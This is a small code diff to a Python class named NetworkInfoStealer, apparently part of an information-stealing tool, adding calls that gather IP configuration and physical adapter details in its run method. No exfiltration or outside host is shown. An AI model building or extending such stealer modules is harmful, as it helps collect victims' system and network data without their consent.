@@ -38,6 +38,9 @@ class NetworkInfoStealer(ModuleManager):
             _file.write(data)
     
     def run(self) -> None:
+        self.ipconfig()
+        self.ipconfiguration()
+        self.physical_adapters()
         self.getnet_ipconfig()
         
         
